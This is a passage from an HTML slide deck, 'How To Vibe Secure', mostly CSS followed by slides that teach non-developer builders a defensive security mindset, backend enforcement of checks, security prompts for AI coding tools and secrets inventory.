  font-size: 0.85rem; 
  line-height: 1.3; 
}

.footnote { 
  text-align: center; 
  margin-top: 2rem; 
  color: var(--muted); 
  font-style: italic; 
}

/* Tagline footer for resources slide */
.tagline-footer {
  text-align: center;
  margin: 2rem 0 0 0;
  padding: 1.5rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-radius: 12px;
  border: 2px solid var(--accent-pastel);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
}

.tagline-footer h3 {
  margin: 0;
  color: var(--accent);
  font-size: 1.4rem;
  font-weight: 700;
  letter-spacing: 0.5px;
}

/* Threat Modeling slide */
.threat-modeling-sections {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  margin-top: 1.5rem;
}

.questions-grid {
  display: grid;
  gap: 1rem;
}

.question {
  padding: 1rem;
  background: var(--subtle);
  border-radius: 6px;
  border: 1px solid var(--border);
}

.question h4 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 1rem;
  font-weight: 600;
}

.question p {
  margin: 0;
  color: var(--muted);
  font-size: 0.9rem;
  line-height: 1.4;
}

.stride-model h3 {
  margin-bottom: 1rem;
  color: var(--text);
}

.stride-grid {
  display: grid;
  gap: 0.75rem;
}

.stride-item {
  padding: 0.75rem;
  background: var(--subtle);
  border-radius: 4px;
  border: 1px solid var(--border);
  font-size: 0.9rem;
  line-height: 1.3;
}

.stride-item strong {
  color: var(--accent);
  font-weight: 700;
}

.stride-desc {
  color: var(--muted);
  font-size: 0.8rem;
  margin-top: 0.25rem;
  line-height: 1.2;
}

@media (max-width: 768px) {
  .threat-modeling-sections {
    grid-template-columns: 1fr;
    gap: 1.5rem;
  }
}

/* Slide 09 compact styles removed to restore original spacing */
/* Demo-specific styling */

/* XSS Demo pulse animation */
@keyframes pulse {
  0% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.02); opacity: 0.8; }
  100% { transform: scale(1); opacity: 1; }
}

/* Enhanced demo components with consistent card styling */
.demo { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 8px; 
  padding: 1.25rem; 
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  position: relative;
  overflow: hidden;
  border-left: 4px solid var(--accent-pastel);
  transition: all 0.2s ease;
}
.demo:hover {
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.demo::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 1px;
  background: var(--accent);
}
.demo h4 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.05rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  padding-bottom: 0.4rem;
  border-bottom: 1px solid var(--border);
}
.demo h4::before {
  content: '🔧';
  font-size: 1.1rem;
}

.demo-controls { 
  display: flex; 
  flex-direction: column; 
  gap: 1rem; 
}

/* Unified button styling with consistent design */
button, .demo button, .user-tab, .sample-buttons button, .test-actions button, .limit-controls button {
  background: var(--accent);
  color: white;
  border: 1px solid var(--accent);
  border-radius: 6px;
  padding: 0.75rem 1.25rem;
  font-weight: 600;
  font-size: 0.9rem;
  font-family: inherit;
  cursor: pointer;
  transition: all 0.2s ease;
  box-shadow: 0 2px 8px rgba(var(--accent-rgb), 0.2);
  position: relative;
  min-width: 44px; /* Accessibility: minimum touch target */
  min-height: 44px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
}

button:hover, .demo button:hover, .user-tab:hover, .sample-buttons button:hover, .test-actions button:hover, .limit-controls button:hover {
  background: var(--accent-dim);
  border-color: var(--accent-dim);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(var(--accent-rgb), 0.3);
}

button:active, .demo button:active, .user-tab:active, .sample-buttons button:active, .test-actions button:active, .limit-controls button:active {
  transform: translateY(0);
  box-shadow: 0 1px 4px rgba(var(--accent-rgb), 0.2);
}

/* Button variants with semantic meaning */
.danger-btn {
  background: var(--accent-danger) !important;
  border-color: var(--accent-danger) !important;
  box-shadow: 0 2px 8px rgba(239, 68, 68, 0.2) !important;
}
.danger-btn:hover {
  background: #dc2626 !important;
  border-color: #dc2626 !important;
  box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3) !important;
}
.danger-btn::before {
  content: '⚠️ ';
}

.safe-btn {
  background: var(--accent-success) !important;
  border-color: var(--accent-success) !important;
  box-shadow: 0 2px 8px rgba(16, 185, 129, 0.2) !important;
}
.safe-btn:hover {
  background: #059669 !important;
  border-color: #059669 !important;
  box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3) !important;
}
.safe-btn::before {
  content: '✓ ';
}

.warning-btn {
  background: var(--accent-warning) !important;
  border-color: var(--accent-warning) !important;
  box-shadow: 0 2px 8px rgba(245, 158, 11, 0.2) !important;
}
.warning-btn:hover {
  background: #d97706 !important;
  border-color: #d97706 !important;
  box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3) !important;
}

/* Secondary button style */
.secondary-btn {
  background: var(--bg) !important;
  color: var(--accent) !important;
  border-color: var(--accent) !important;
  box-shadow: 0 1px 4px rgba(var(--accent-rgb), 0.1) !important;
}
.secondary-btn:hover {
  background: var(--accent) !important;
  color: white !important;
}

button:disabled {
  background: var(--border) !important;
  color: var(--text-dim) !important;
  border-color: var(--border) !important;
  cursor: not-allowed !important;
  transform: none !important;
  box-shadow: none !important;
  opacity: 0.6;
}
.demo-status { 
  margin: 0.75rem 0 0 0; 
  padding: 0.6rem; 
  background: var(--bg-elev); 
  border-radius: 6px; 
  border: 1px solid var(--border); 
  font-family: ui-monospace, monospace;
  font-size: 0.85rem;
  min-height: 2rem;
  display: flex;
  align-items: center;
}
.demo-instructions { 
  margin-top: 0.75rem; 
  padding: 0.75rem; 
  background: rgba(var(--accent-rgb), 0.05); 
  border: 1px solid rgba(var(--accent-rgb), 0.1);
  border-radius: 6px; 
  font-size: 0.85rem;
  border-left: 3px solid var(--accent-pastel);
}
.demo-instructions::before {
  content: '📝 ';
  font-weight: 600;
  color: var(--accent);
}

/* User tabs for RLS demo */
.user-tabs { 
  display: flex; 
  gap: 0.5rem; 
  margin-bottom: 1rem; 
}
.user-tab { 
  padding: 0.5rem 1rem; 
  font-size: 0.9rem;
}
.user-tab:not(.active) {
  background: var(--bg-elev) !important;
  color: var(--accent) !important;
  border-color: var(--border) !important;
  box-shadow: none !important;
}
.user-tab.active { 
  background: var(--accent) !important;
  color: white !important;
  border-color: var(--accent) !important;
}

.test-actions { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-bottom: 1rem; 
}
.test-actions button { 
  padding: 0.5rem 1rem; 
  font-size: 0.85rem;
}

/* Results styling */
.rls-results, .scan-results, .validation-results, .request-log, .headers-output, .ssrf-results, .test-output, .access-results { 
  margin-top: 1rem; 
  min-height: 3rem; 
  padding: 1rem; 
  background: var(--bg-elev); 
  border: 1px solid var(--border); 
  border-radius: 0.5rem; 
}

/* Enhanced headers analysis styles */
.security-header-analysis {
  margin: 0.75rem 0;
  padding: 0.75rem;
  background: rgba(255, 255, 255, 0.03);
  border-radius: 0.5rem;
  border-left: 3px solid var(--accent);
}
.header-name {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 0.5rem;
}
.header-name strong {
  color: var(--accent);
  font-size: 0.9rem;
}
.status-badge {
  padding: 0.2rem 0.5rem;
  border-radius: 1rem;
  font-size: 0.7rem;
  font-weight: 600;
  text-transform: uppercase;
}
.status-good {
  background: rgba(34, 197, 94, 0.2);
  color: #22c55e;
}
.status-warning {
  background: rgba(251, 191, 36, 0.2);
  color: #fbbf24;
}
.status-info {
  background: rgba(59, 130, 246, 0.2);
  color: #3b82f6;
}
.header-value {
  margin: 0.5rem 0;
}
.header-value code {
  font-size: 0.8rem;
  background: rgba(0, 0, 0, 0.3);
  padding: 0.25rem 0.5rem;
  border-radius: 0.25rem;
  word-break: break-all;
}
.header-explanation {
  color: var(--muted);
  font-size: 0.85rem;
  margin: 0.5rem 0;
}
.header-improvement {
  color: var(--accent);
  font-size: 0.8rem;
  margin-top: 0.5rem;
  font-style: italic;
}
.origin-info {
  margin: 0.75rem 0;
  padding: 0.75rem;
  background: rgba(59, 130, 246, 0.1);
  border-radius: 0.5rem;
  border: 1px solid rgba(59, 130, 246, 0.2);
}
.origin-info strong {
  color: #3b82f6;
}
.origin-info code {
  background: rgba(0, 0, 0, 0.3);
  padding: 0.25rem 0.5rem;
  border-radius: 0.25rem;
  font-weight: 600;
}
.origin-info small {
  color: var(--muted);
  font-style: italic;
}
.security-summary {
  margin-top: 1rem;
  padding: 0.75rem;
  background: rgba(34, 197, 94, 0.1);
  border-radius: 0.5rem;
  border: 1px solid rgba(34, 197, 94, 0.2);
  font-size: 0.9rem;
}
.security-summary strong {
  color: #22c55e;
}

/* RLS Demo specific styles - ultra compact */
.data-creation {
  margin-bottom: 0.5rem;
}

.create-controls {
  display: flex;
  gap: 0.3rem;
  align-items: center;
  flex-wrap: wrap;
}

.create-controls select, .create-controls input {
  padding: 0.3rem;
  border: 1px solid var(--border);
  border-radius: 0.25rem;
  background: var(--bg-main);
  color: var(--text-primary);
  font-size: 0.8rem;
}

.create-controls input {
  flex: 1;
  min-width: 150px;
}

.database-table, .query-results {
  margin: 0.5rem 0;
}

.database-table h5, .query-results h5 {
  margin: 0 0 0.3rem 0;
  color: var(--text-primary);
  font-weight: 600;
  font-size: 0.8rem;
}

#databaseTable, #resultsTable {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.7rem;
  background: var(--bg-main);
  border: 1px solid var(--border);
  border-radius: 0.25rem;
  overflow: hidden;
}

#databaseTable th, #databaseTable td,
#resultsTable th, #resultsTable td {
  padding: 0.25rem 0.4rem;
  text-align: left;
  border-bottom: 1px solid var(--border);
  line-height: 1.2;
}

#databaseTable th, #resultsTable th {
  background: var(--bg-elev);
  font-weight: 600;
  color: var(--text-primary);
  font-size: 0.65rem;
}

#databaseTable td, #resultsTable td {
  font-family: var(--font-mono);
  font-size: 0.65rem;
}

.query-controls {
  margin: 0.5rem 0;
  padding: 0.5rem;
  background: var(--bg-elev);
  border: 1px solid var(--border);
  border-radius: 0.25rem;
}

.query-settings {
  display: flex;
  gap: 0.5rem;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 0.5rem;
}

.current-user, .rls-toggle {
  display: flex;
  align-items: center;
  gap: 0.3rem;
}

.query-settings select {
  padding: 0.25rem;
  border: 1px solid var(--border);
  border-radius: 0.25rem;
  background: var(--bg-main);
  color: var(--text-primary);
  font-size: 0.75rem;
}

.rls-toggle label {
  display: flex;
  align-items: center;
  gap: 0.3rem;
  font-size: 0.8rem;
  cursor: pointer;
}

.query-btn {
  background: var(--accent);
  color: white;
  border: none;
  padding: 0.4rem 0.8rem;
  border-radius: 0.25rem;
  font-family: var(--font-mono);
  font-size: 0.75rem;
  cursor: pointer;
}

.sql-display {
  margin: 0.3rem 0;
  padding: 0.4rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 0.25rem;
  border-left: 3px solid var(--accent);
}

.sql-display code {
  font-family: var(--font-mono);
  font-size: 0.7rem;
  color: var(--text);
}

.security-warning {
  margin-top: 0.3rem;
  padding: 0.4rem;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid #ef4444;
  border-radius: 0.25rem;
  color: #ef4444;
  font-size: 0.75rem;
  font-weight: 500;
}

/* Table row visual feedback */
.accessible {
  background: rgba(34, 197, 94, 0.1);
}

.blocked {
  background: rgba(156, 163, 175, 0.3);
  opacity: 0.6;
}

.own-record {
  background: rgba(34, 197, 94, 0.1);
}

.exposed-record {
  background: rgba(239, 68, 68, 0.1);
  animation: pulse-warning 2s infinite;
}

@keyframes pulse-warning {
  0%, 100% { background: rgba(239, 68, 68, 0.1); }
  50% { background: rgba(239, 68, 68, 0.2); }
}

.rls-result, .log-entry, .ssrf-result { 
  padding: 0.75rem; 
  margin: 0.5rem 0; 
  border-radius: 0.375rem; 
  border-left: 3px solid;
}

/* Semantic result styling with icons and labels */
.success { 
  border-left-color: var(--accent-success); 
  background: rgba(16, 185, 129, 0.08); 
}
.success::before {
  content: '✓ SUCCESS: ';
  font-weight: 700;
  color: var(--accent-success);
}
.error { 
  border-left-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.08); 
}
.error::before {
  content: '✖ ERROR: ';
  font-weight: 700;
  color: var(--accent-danger);
}
.warning { 
  border-left-color: var(--accent-warning); 
  background: rgba(245, 158, 11, 0.08); 
}
.warning::before {
  content: '⚠ WARNING: ';
  font-weight: 700;
  color: var(--accent-warning);
}
.info { 
  border-left-color: #0ea5e9; 
  background: rgba(14, 165, 233, 0.08); 
}
.info::before {
  content: '📝 INFO: ';
  font-weight: 700;
  color: #0ea5e9;
}

/* XSS Demo specific */
.demo-inputs, .demo-output { 
  margin: 1rem 0; 
}
.demo-buttons { 
  display: flex; 
  gap: 0.75rem; 
  margin-top: 1rem; 
  flex-wrap: wrap; 
  align-items: center;
}
/* Legacy button overrides - handled by unified styling above */

.xss-output { 
  padding: 1rem; 
  border: 1px solid var(--border); 
  border-radius: 6px; 
  min-height: 3rem; 
  margin-top: 1rem; 
  font-family: ui-monospace, monospace;
  font-size: 0.9rem;
  position: relative;
}
.xss-output.insecure { 
  border-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.05); 
  border-left: 4px solid var(--accent-danger);
}
.xss-output.insecure::before {
  content: '🚨 INSECURE RENDERING';
  position: absolute;
  top: -0.75rem;
  left: 1rem;
  background: var(--bg);
  padding: 0.25rem 0.5rem;
  font-size: 0.75rem;
  font-weight: 700;
  color: var(--accent-danger);
  border-radius: 4px;
  border: 1px solid var(--accent-danger);
}
.xss-output.secure { 
  border-color: var(--accent-success); 
  background: rgba(16, 185, 129, 0.05); 
  border-left: 4px solid var(--accent-success);
}
.xss-output.secure::before {
  content: '✓ SECURE RENDERING';
  position: absolute;
  top: -0.75rem;
  left: 1rem;
  background: var(--bg);
  padding: 0.25rem 0.5rem;
  font-size: 0.75rem;
  font-weight: 700;
  color: var(--accent-success);
  border-radius: 4px;
  border: 1px solid var(--accent-success);
}

.xss-samples, .ssrf-samples { 
  margin-top: 1rem; 
  font-size: 0.9rem; 
}
/* Ensure SSRF samples only appear within the server-calls slide */
.ssrf-samples {
  position: relative;
  z-index: 1;
}
#server-calls .ssrf-samples {
  display: block;
}
.slide:not(#server-calls) .ssrf-samples {
  display: none !important;
}
.sample-buttons { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-top: 0.5rem; 
}
.sample-buttons button { 
  padding: 0.375rem 0.75rem; 
  font-size: 0.8rem; 
  min-width: auto;
  min-height: auto;
}

/* Rate limit demo styling */
.limit-controls { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-bottom: 1rem; 
}
.limit-controls button { 
  padding: 0.5rem 1rem; 
  font-size: 0.85rem;
}

/* Unified input styling across all demos */
input[type="text"], input[type="url"], input[type="email"], textarea, select {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid var(--border);
  border-radius: 6px;
  font-family: inherit;
  font-size: 0.9rem;
  background: var(--bg);
  color: var(--text);
  transition: all 0.2s ease;
  box-sizing: border-box;
}
input:focus, textarea:focus, select:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(var(--accent-rgb), 0.1);
}
textarea {
  font-family: ui-monospace, monospace;
  resize: vertical;
  min-height: 120px;
}
.findings { 
  margin-top: 1rem; 
}
.finding { 
  padding: 0.75rem; 
  margin: 0.5rem 0; 
  border-radius: 0.375rem; 
  border-left: 3px solid; 
}
.finding.high { 
  border-left-color: var(--accent-danger); 
  background: rgba(239, 68, 68, 0.08); 
}
.finding.high::before {
  content: '🔴 HIGH RISK: ';
  font-weight: 700;
  color: var(--accent-danger);
}
.finding.medium { 
  border-left-color: var(--accent-warning); 
  background: rgba(245, 158, 11, 0.08); 
}
.finding.medium::before {
  content: '🟡 MEDIUM RISK: ';
  font-weight: 700;
  color: var(--accent-warning);
}
.finding.low { 
  border-left-color: #6b7280; 
  background: rgba(107, 114, 128, 0.08); 
}
.finding.low::before {
  content: '⚪ LOW RISK: ';
  font-weight: 700;
  color: #6b7280;
}

/* File upload styling */
input[type="file"] { 
  margin-bottom: 1rem; 
  padding: 0.5rem; 
  border: 2px dashed var(--border); 
  border-radius: 6px; 
  background: var(--bg-elev);
  cursor: pointer;
  transition: all 0.2s ease;
}
input[type="file"]:hover {
  border-color: var(--accent);
  background: rgba(var(--accent-rgb), 0.05);
}
.upload-status { 
  margin: 0.5rem 0; 
}
.validation-summary { 
  padding: 0.75rem; 
  border-radius: 0.375rem; 
  font-weight: 600; 
  margin-bottom: 1rem; 
}
.validation-details { }
.validation-item { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  border-radius: 0.25rem; 
  font-size: 0.9rem; 
}
.validation-item.pass { 
  background: rgba(16, 185, 129, 0.08); 
  border-left: 3px solid var(--accent-success);
}
.validation-item.pass::before {
  content: '✓ PASS: ';
  font-weight: 700;
  color: var(--accent-success);
}
.validation-item.fail { 
  background: rgba(239, 68, 68, 0.08); 
  border-left: 3px solid var(--accent-danger);
}
.validation-item.fail::before {
  content: '✖ FAIL: ';
  font-weight: 700;
  color: var(--accent-danger);
}
.validation-item.warning { 
  background: rgba(245, 158, 11, 0.08); 
  border-left: 3px solid #f59e0b;
}
.validation-item.warning::before {
  content: '⚠ WARN: ';
  font-weight: 700;
  color: #f59e0b;
}

/* Input groups and labels */
.input-group {
  margin: 1rem 0;
}
.input-group label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 600;
  color: var(--text);
  font-size: 0.9rem;
}
.input-group input, .input-group textarea, .input-group select {
  margin-bottom: 0.5rem;
}

/* Headers demo styling */
.headers-list { }
.header-item { 
  margin: 0.75rem 0; 
  padding: 0.75rem; 
  background: var(--bg-elev); 
  border: 1px solid var(--border); 
  border-radius: 0.375rem; 
}
.header-item strong { 
  color: var(--accent); 
}
.header-item code { 
  display: block; 
  margin-top: 0.25rem; 
  font-size: 0.85rem; 
}

/* Test output styling */
.test-step { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  background: var(--bg-elev); 
  border-radius: 0.25rem; 
}
.test-results { 
  margin-top: 1rem; 
  padding: 1rem; 
  border-radius: 0.5rem; 
}
.test-results.pass { 
  background: rgba(16, 185, 129, 0.08); 
  border: 1px solid var(--accent-success); 
  border-left: 4px solid var(--accent-success);
}
.test-results.pass::before {
  content: '✓ TEST PASSED';
  display: block;
  font-weight: 700;
  color: var(--accent-success);
  margin-bottom: 0.5rem;
  font-size: 0.9rem;
}
.test-results.fail { 
  background: rgba(239, 68, 68, 0.08); 
  border: 1px solid var(--accent-danger); 
  border-left: 4px solid var(--accent-danger);
}
.test-results.fail::before {
  content: '✖ TEST FAILED';
  display: block;
  font-weight: 700;
  color: var(--accent-danger);
  margin-bottom: 0.5rem;
  font-size: 0.9rem;
}
.result-item { 
  padding: 0.5rem; 
  margin: 0.25rem 0; 
  border-radius: 0.25rem; 
}
.conclusion { 
  font-weight: 600; 
  margin-top: 1rem; 
  padding: 0.75rem; 
  border-radius: 0.375rem; 
}

.loading { 
  text-align: center; 
  color: var(--muted); 
  font-style: italic; 
}

.security-note { 
  color: #22c55e; 
  font-weight: 500; 
  margin-top: 0.5rem; 
}
.security-warning { 
  color: #ef4444; 
  font-weight: 500; 
  margin-top: 0.5rem; 
}

/* Secrets Demo - Grid Layout */
.secrets-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 0.3rem;
  margin: 0.2rem 0;
}

.secret-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 0.35rem;
  cursor: pointer;
  transition: all 0.2s ease;
  position: relative;
  overflow: hidden;
  min-height: 2.2rem;
}

.secret-card:hover {
  border-color: var(--accent);
  background: var(--bg-hover);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.secret-card.selected {
  border-color: var(--accent);
  background: var(--bg-hover);
  box-shadow: 0 0 0 2px rgba(var(--accent-rgb), 0.2);
}

.secret-type {
  font-weight: 600;
  font-size: 0.75rem;
  color: var(--text);
  margin-bottom: 0.2rem;
  line-height: 1.2;
}

.secret-preview {
  font-family: var(--font-mono);
  font-size: 0.6rem;
  color: var(--muted);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.secret-info {
  margin-top: 0.4rem;
}

.secret-details {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 0.5rem;
  border-left: 4px solid var(--border);
}

.secret-details.success {
  border-left-color: #22c55e;
  background: rgba(34, 197, 94, 0.05);
}

.secret-details.error {
  border-left-color: #ef4444;
  background: rgba(239, 68, 68, 0.05);
}

.secret-details.warning {
  border-left-color: #f59e0b;
  background: rgba(245, 158, 11, 0.05);
}

.secret-details h4 {
  margin: 0 0 0.5rem 0;
  color: var(--text);
  font-size: 1rem;
}

.secret-details .location {
  font-weight: 600;
  margin-bottom: 0.75rem;
  font-size: 0.9rem;
}

.secret-details.success .location {
  color: #22c55e;
}

.secret-details.error .location {
  color: #ef4444;
}

.secret-details.warning .location {
  color: #f59e0b;
}

.secret-details p {
  margin: 0 0 1rem 0;
  color: var(--text);
  line-height: 1.4;
}

.secret-details .example {
  background: var(--bg-subtle);
  border-radius: 4px;
  padding: 0.4rem;
  margin-top: 0.4rem;
}

.secret-details .example strong {
  color: var(--muted);
  font-size: 0.75rem;
  display: block;
  margin-bottom: 0.3rem;
}

.secret-details .example code {
  font-family: var(--font-mono);
  font-size: 0.7rem;
  color: var(--text);
  word-break: break-all;
  display: block;
}

/* Modal styling */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(4px);
}

.modal-content {
  position: relative;
  background: var(--bg);
  border-radius: 8px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  border: 1px solid var(--border);
  max-width: 600px;
  width: 90%;
  max-height: 80vh;
  overflow: hidden;
  animation: modalSlideIn 0.2s ease-out;
}

@keyframes modalSlideIn {
  from {
    opacity: 0;
    transform: scale(0.95) translateY(-10px);
  }
  to {
    opacity: 1;
    transform: scale(1) translateY(0);
  }
}

.modal-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 1rem 1.25rem;
  border-bottom: 1px solid var(--border);
  background: var(--bg-elev);
}

.modal-header h3 {
  margin: 0;
  color: var(--accent);
  font-size: 1.1rem;
  font-weight: 600;
}

.modal-close {
  background: none;
  border: none;
  font-size: 1.5rem;
  color: var(--muted);
  cursor: pointer;
  padding: 0.25rem;
  line-height: 1;
  transition: color 0.2s ease;
  min-width: auto;
  min-height: auto;
  box-shadow: none;
}

.modal-close:hover {
  color: var(--text);
  background: none;
  transform: none;
}

.modal-body {
  padding: 1.25rem;
  overflow-y: auto;
  max-height: calc(80vh - 80px);
}

/* Headers analysis in modal */
.headers-analysis {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.analysis-summary {
  padding: 1rem;
  border-radius: 6px;
  font-weight: 600;
  font-size: 1rem;
  text-align: center;
  border-left: 4px solid;
}

.analysis-summary.good {
  background: rgba(34, 197, 94, 0.1);
  color: #22c55e;
  border-left-color: #22c55e;
}

.analysis-summary.warning {
  background: rgba(245, 158, 11, 0.1);
  color: #f59e0b;
  border-left-color: #f59e0b;
}

.headers-detail {
  display: grid;
  gap: 0.75rem;
}

.header-analysis-item {
  padding: 0.75rem;
  background: var(--bg-elev);
  border: 1px solid var(--border);
  border-radius: 6px;
  border-left: 4px solid;
}

.header-analysis-item.present {
  border-left-color: #22c55e;
}

.header-analysis-item.missing {
  border-left-color: #ef4444;
}

.header-analysis-item h4 {
  margin: 0 0 0.5rem 0;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-size: 0.95rem;
  font-weight: 600;
}

.header-analysis-item.present h4 {
  color: #22c55e;
}

.header-analysis-item.missing h4 {
  color: #ef4444;
}

.header-analysis-item p {
  margin: 0.25rem 0 0 0;
  font-size: 0.9rem;
  line-height: 1.4;
  color: var(--text-dim);
}

.origin-info-modal {
  margin-top: 1rem;
  padding: 0.75rem;
  background: rgba(59, 130, 246, 0.1);
  border: 1px solid rgba(59, 130, 246, 0.2);
  border-radius: 6px;
  font-size: 0.9rem;
}

.origin-info-modal strong {
  color: #3b82f6;
}

/* Small screens - demo responsive */
@media (max-width: 700px) { 
  .user-tabs { 
    flex-wrap: wrap; 
  }
  .test-actions { 
    justify-content: center; 
  }
  .limit-controls { 
    justify-content: center; 
  }
  .secrets-grid {
    grid-template-columns: repeat(2, 1fr);
    gap: 0.3rem;
  }
  .secret-card {
    padding: 0.4rem;
  }
  
  .modal-content {
    width: 95%;
    max-height: 90vh;
  }
  
  .modal-body {
    padding: 1rem;
    max-height: calc(90vh - 80px);
  }
}
    </style>
  </head>
  <body>

    <main id="content">
      <section class="slide" id="intro" data-color="blue" tabindex="-1">
  <h1>How To Vibe Secure</h1>
  <p class="subtitle">Fast, Practical Playbook</p>
  <ul class="lead">
    <li><strong>Audience:</strong> non‑dev builders using AI to ship fast</li>
    <li><strong>Goal:</strong> ship things that would be resilient on the internet</li>
  </ul>
  <div class="about-author">
    <p>Vibe coded by <strong><a href="https://x.com/hankyone" target="_blank" rel="noopener noreferrer">@hankyone</a></strong> — <a href="https://www.linkedin.com/in/anouarmansour/" target="_blank" rel="noopener noreferrer">LinkedIn</a></p>
    <div class="author-background">
      <p>Co-founder <strong>@</strong> ShadeSec</p>
      <p>Offensive Security <strong>@</strong> Microsoft</p>
      <p>Penetration Tester <strong>@</strong> Government of Ontario</p>
      <p>Senior Consultant in Threat and Vulnerability <strong>@</strong> Deloitte</p>
      <p>Cyber Operator, Reconnaissance <strong>@</strong> Canadian Forces, DND</p>
    </div>
  </div>
</section>
<section class="slide" id="mindset" data-color="red" tabindex="-1">
  <h2>Security Mindset: Adversarial Thinking</h2>
  
  <div class="lead-question">
    <h3>Before you build or implement a feature, ask:</h3>
    <div class="big-question">"What would a malicious user be able to do?"</div>
  </div>

  <div class="one-prompt-away">
    <h3>🤖 You're just one prompt away from security</h3>
    <ul class="ai-prompts">
      <li><strong>Don't understand the feature?</strong> → Ask AI to explain it</li>
      <li><strong>Not sure if it's secure?</strong> → Ask "Why is this secure?"</li>
      <li><strong>Push back on the AI</strong> → "What could go wrong with this approach?"</li>
    </ul>
  </div>

  <div class="adversarial-questions">
    <h3>⚡ Security Questions for Vibe Coders</h3>
    <ul class="question-list">
      <li>What bad data could users submit?</li>
      <li>Who should NOT access this data?</li>
      <li>What happens if this gets spammed?</li>
      <li>What secrets am I accidentally exposing?</li>
      <li>Where could users bypass my checks?</li>
      <li>How do I prompt AI for secure code?</li>
    </ul>
  </div>
</section>
<section class="slide" id="frontend-backend" data-color="violet" tabindex="-1">
  <h2>Frontend vs Backend: UX vs Security</h2>
  <div class="comparison">
    <div class="frontend-side">
      <h3>Frontend = UX</h3>
      <p>Assume attackers can change anything in the browser</p>
    </div>
    <div class="backend-side">
      <h3>Backend = Authority</h3>
      <p>Enforce all checks server/DB-side</p>
    </div>
  </div>
  <div id="frontendBackendDemo" class="demo">
    <h4>Demo: DevTools Button Bypass</h4>
    <div class="demo-controls">
      <button id="checkoutBtn" disabled>💳 Checkout ($99.99)</button>
      <p class="demo-status">Button is disabled in UI. Try enabling it with DevTools!</p>
    </div>
  </div>
  <details class="notes">
    <summary>Examples</summary>
    <ul>
      <li>Disabled button → DevTools removes <code>disabled</code> → request still hits server</li>
      <li>Hidden price field → user edits price client-side → server must compute price from DB</li>
      <li>Read-only role selector → user flips to <code>admin</code> → server ignores and uses server-side role</li>
    </ul>
  </details>
</section>
<section class="slide" id="ai-prompts" data-color="indigo" tabindex="-1">
  <h2>How to Talk to Your AI</h2>
  
  <div class="context-first">
    <h3>🎯 Give Context First</h3>
    <p><strong>Ramble!</strong> Start with what you want to build, then keep talking about your security concerns. The more you share your worries, the better security advice you get.</p>
    <div class="example-context">
      <em>"I need a recipe sharing feature where users can upload photos and recipes. Actually, I'm using Supabase for the backend. Oh wait, I'm worried about people uploading malware disguised as images. Also, what if users can see other people's private recipes? And what if someone spams the upload endpoint? I'm not sure how to handle file validation either..."</em>
    </div>
  </div>

  <div class="prompt-template">
    <h3>✅ Then ask for these 4 things:</h3>
    <ul class="security-criteria">
      <li><strong>Input checking:</strong> What could users send that would break things?</li>
      <li><strong>Who sees what:</strong> How do I make sure users only see their own stuff?</li>
      <li><strong>Spam protection:</strong> How do I stop someone from spamming my app?</li>
      <li><strong>Quick test:</strong> Give me a way to verify these protections actually work</li>
    </ul>
  </div>
  
  <div class="one-liner">
    <strong>Copy-paste starter for production security:</strong><br>
    <em>"Before this goes live: Are all routes properly authenticated? Can users only access their own data? Are there rate limits to prevent spam and abuse? How do I verify that unauthorized users get rejected with proper error codes? Walk me through testing these security controls step by step."</em>
  </div>
</section>
<section class="slide" id="secrets" data-color="orange" tabindex="-1">
  <h2>Secrets Management</h2>
  <div class="assistant-brief">
    <h3>Secrets Inventory Prompt</h3>
    <div class="prompt-box">
      <p>"List all secrets in this app. For each secret: 1) What is it used for? 2) Where is it stored? 3) Is it public or private? 4) Does it have correct prefix? Make sure no secrets are exposed accidentally."</p>
    </div>
  </div>
  <div class="env-vars-info">
    <h3>💡 Key Rule</h3>
